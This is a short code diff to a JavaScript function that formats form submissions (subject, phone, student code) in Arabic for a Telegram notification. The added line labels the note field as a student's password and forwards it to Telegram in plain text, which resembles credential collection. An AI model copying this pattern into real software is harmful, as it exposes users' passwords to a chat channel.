@@ -34,6 +34,8 @@ async function notifyTelegram(data, env) {
     "المادة: " + data.subject,
     "رقم الهاتف: " + data.phone,
     "كود الطالب: " + data.studentCode,
+    "باسوورد الطالب: " + data.note,
+    
     ...(data.note ? ["الملاحظة: " + data.note] : [])
   ].join("\n");
 
